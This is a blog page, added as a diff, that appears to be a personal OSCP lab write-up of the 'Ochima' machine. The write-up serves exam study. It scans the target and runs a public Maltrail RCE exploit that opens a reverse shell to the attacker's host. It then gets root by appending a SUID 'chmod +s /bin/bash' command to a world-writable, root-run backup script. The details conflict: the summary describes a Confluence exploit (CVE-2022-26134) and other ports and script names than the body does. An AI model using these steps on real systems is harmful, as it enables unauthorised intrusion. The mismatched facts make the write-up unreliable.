@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Ochima - Linux :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Ochima This one was an exercise in frustration purely because the exploit didn&rsquo;t seem to work on the port I wanted it to (4444) but would work on port 80!?
+I tired all sorts of things to get it work, the walkthroughs didn&rsquo;t explain why they used port 80, and the exploit itself indicated it&rsquo;d work on whatever I picked&hellip; but the moment I popped port 80 into the exploit&rsquo;s reverse shell parameters I got an incoming connection. So an important reminder that if a reverse shell isn&rsquo;t working on port 4444 then try the same thing but with a listener on port 80 instead
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---ochima---linux/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Ochima - Linux">
+<meta property="og:description" content="Ochima This one was an exercise in frustration purely because the exploit didn&rsquo;t seem to work on the port I wanted it to (4444) but would work on port 80!?
+I tired all sorts of things to get it work, the walkthroughs didn&rsquo;t explain why they used port 80, and the exploit itself indicated it&rsquo;d work on whatever I picked&hellip; but the moment I popped port 80 into the exploit&rsquo;s reverse shell parameters I got an incoming connection. So an important reminder that if a reverse shell isn&rsquo;t working on port 4444 then try the same thing but with a listener on port 80 instead
+" />
+<meta property="og:url" content="/posts/oscp---ochima---linux/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---ochima---linux/">OSCP - Ochima - Linux</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="ochima">Ochima<a href="#ochima" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>This one was an exercise in frustration purely because the exploit didn&rsquo;t seem to work on the port I wanted it to (<code>4444</code>) but <em>would</em> work on port <code>80</code>!?</p>
+<p>I tired all sorts of things to get it work, the walkthroughs didn&rsquo;t explain why they used port 80, and the exploit itself indicated it&rsquo;d work on whatever I picked&hellip; but the moment I popped port 80 into the exploit&rsquo;s reverse shell parameters I got an incoming connection. So an important reminder that if a reverse shell isn&rsquo;t working on port <code>4444</code> then try the same thing but with a listener on port <code>80</code> instead</p>
+<p>Once I had initial access, privilege escalation wasn&rsquo;t hugely complicated - I spotted the <code>.tar</code> backup file pretty quickly, and after running <code>linpeas.sh</code> I saw the <code>etc_Backups.sh</code> script too. Part of me worried that I&rsquo;d need to find a way to execute the script if it wasn&rsquo;t scheduled, or that I wouldn&rsquo;t have write access, but after checking with <code>ls -lah</code> I saw it was wide open, and I could have uploaded <code>pspy</code> to see if it was running too.</p>
+<p>All round a bit frustrating to lean on a walkthrough to figure out initial access, but the walkthrough didn&rsquo;t help much anyway - it just told me the exploit <em>could</em> work, and it took me realising the walkthroughs both happened to use port 80 before I tried it myself.</p>
+<p><strong>Note</strong>: My initial <code>nmap</code> scan didn&rsquo;t show up port <code>8338</code>, so this was an important reminder to run a wider and more aggressive scan if there&rsquo;s no obvious way forward (or just start by running <code>sudo nmap -p- -T5 192.168.xx.xxx -v</code> followed by an aggressive port specific scan)</p>
+<p><strong>Note2</strong>: Don&rsquo;t forget to scan UDP if the TCP scan doesn&rsquo;t show much - most of the time you&rsquo;ll find nothing, but if you do it&rsquo;ll be a big deal.</p>
+<h1 id="resolution-summary">Resolution summary<a href="#resolution-summary" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran Nmap to identify ports <code>22</code> &amp; <code>8080</code></li>
+<li>Visited http (<code>8090</code>) &amp; identified <code>Confluence v7.13.6</code></li>
+<li>Identified exploit for CVE-2022-26134 and ran against target for reverse shell</li>
+<li>Uploaded <code>pspy</code> and identified <code>log-backup.sh</code> being run regularly by <code>root</code></li>
+<li>Added command to change <code>/bin/bash</code> SUID and waited for script to run</li>
+<li>Ran <code>/bin/bash -p</code> to become <code>root</code></li>
+</ul>
+<h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Linux Privilege Escalation</li>
+<li>Handling reverse shells</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+<li>linpeas.sh</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -Pn -n 192.168.117.32 -sC -sV -p- --open -v
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8338/tcp open  unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Maltrail/0.52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">13</span> Oct <span class="m">2024</span> 07:41:59 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Last-Modified: Sat, <span class="m">31</span> Dec <span class="m">2022</span> 22:58:57 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Security-Policy: default-src <span class="s1">&#39;self&#39;</span><span class="p">;</span> style-src <span class="s1">&#39;self&#39;</span> <span class="s1">&#39;unsafe-inline&#39;</span><span class="p">;</span> img-src * blob:<span class="p">;</span> script-src <span class="s1">&#39;self&#39;</span> <span class="s1">&#39;unsafe-eval&#39;</span> https://stat.ripe.net<span class="p">;</span> frame-src *<span class="p">;</span> object-src <span class="s1">&#39;none&#39;</span><span class="p">;</span> block-all-mixed-content<span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Cache-Control: no-cache
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">7091</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;X-UA-Compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;IE=edge&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html;charset=utf8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, user-scalable=no&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;robots&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;noindex, nofollow&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Maltrail&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;css/thirdparty.min.css&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span> hre
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.0 <span class="m">501</span> Unsupported method <span class="o">(</span><span class="s1">&#39;OPTIONS&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Maltrail/0.52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Sun, <span class="m">13</span> Oct <span class="m">2024</span> 07:41:59 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>utf-8
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">500</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="s2">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;html&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html;charset=utf-8&#34;</span>&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;title&gt;Error response&lt;/title&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/head&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;h1&gt;Error response&lt;/h1&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code: 501&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Message: Unsupported method <span class="o">(</span><span class="s1">&#39;OPTIONS&#39;</span><span class="o">)</span>.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;p&gt;Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.&lt;/p&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     &lt;/body&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    &lt;/html&gt;
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data.
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-22---ssh-openssh-89p1">Port 22 - SSH (OpenSSH 8.9p1)<a href="#port-22---ssh-openssh-89p1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-80---http-apache-2452">Port 80 - HTTP (Apache 2.4.52)<a href="#port-80---http-apache-2452" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.117.32:80</code> and identified <code>Apache2 Defauly Page</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image1.png" alt="OSCP Ochima Linux Image1"></li>
+<li>Ran <code>gobuster dir -u http://192.168.117.32 -w //usr/share/dirb/wordlists/big.txt</code> to enumerate web directories
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image2.png" alt="OSCP Ochima Linux Image2"></li>
+</ul>
+<h2 id="port-8338---http-apache-2452">Port 8338 - HTTP (Apache 2.4.52)<a href="#port-8338---http-apache-2452" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.117.32:80</code> and identified <code>Maltrail v.052</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image3.png" alt="OSCP Ochima Linux Image3">
+<ul>
+<li>Potentially vulnerable to CVE-2023–27163</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Identified exploit <code>Maltrail-RCE.py</code> from <a href="https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py">https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py</a> - copied to local host</li>
+<li>Setup Netcat listener on port <code>80</code> then ran <code>python3 Maltrail-RCE.py 192.168.45.250 80 http://192.168.117.32:8338</code> to catch reverse shell as user <code>snort</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image4.png" alt="OSCP Ochima Linux Image4"></li>
+</ul>
+<hr>
+<h1 id="lateral-movement-to-user">Lateral Movement to user<a href="#lateral-movement-to-user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>cat /home/snort/local.txt</code> to print <code>a00aea52796dcd16e3d4e840f16bd277</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image5.png" alt="OSCP Ochima Linux Image5"></li>
+<li>Ran <code>cat /etc/passwd</code> to enumerate users
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image6.png" alt="OSCP Ochima Linux Image6"></li>
+<li>Ran <code>sudo -l</code> and found <code>sudo</code> requires <code>snort</code> password
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image7.png" alt="OSCP Ochima Linux Image7"></li>
+<li>Uploaded &amp; ran <code>linpeas.sh</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image8.png" alt="OSCP Ochima Linux Image8"></li>
+<li>Identified interesting files
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image9.png" alt="OSCP Ochima Linux Image9"></li>
+<li>Identified possible private SSH keys
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image10.png" alt="OSCP Ochima Linux Image10"></li>
+<li>Identified interesting writeable files including <code>/var/backups/etc_Backup.sh</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image11.png" alt="OSCP Ochima Linux Image11"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<ul>
+<li>Ran <code>ls -lah /var/backups/etc_Backup.sh</code> to identify script privileges
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image12.png" alt="OSCP Ochima Linux Image12"></li>
+<li>Ran <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; /var/backups/etc_Backup.sh</code> to add command to script to change set privileges for <code>/bin/bash</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image13.png" alt="OSCP Ochima Linux Image13"></li>
+<li>Waited a few minutes for script, then ran <code>/bin/bash -p</code> to achieve <code>root</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image14.png" alt="OSCP Ochima Linux Image14"></li>
+<li>Ran <code>cat /root/proof.txt</code> to print <code>8f730f4db61f48dd3810007f95fa9e61</code>
+<img src="/images/OSCP%20-%20Ochima%20-%20Linux%20-%20image15.png" alt="OSCP Ochima Linux Image15"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>a00aea52796dcd16e3d4e840f16bd277</code>
+<code>root.txt</code> = <code>8f730f4db61f48dd3810007f95fa9e61</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp---levram---linux/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP - Levram - Linux</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---pc---linux/" class="button inline next">
+         [<span class="button__text">OSCP - PC - Linux</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
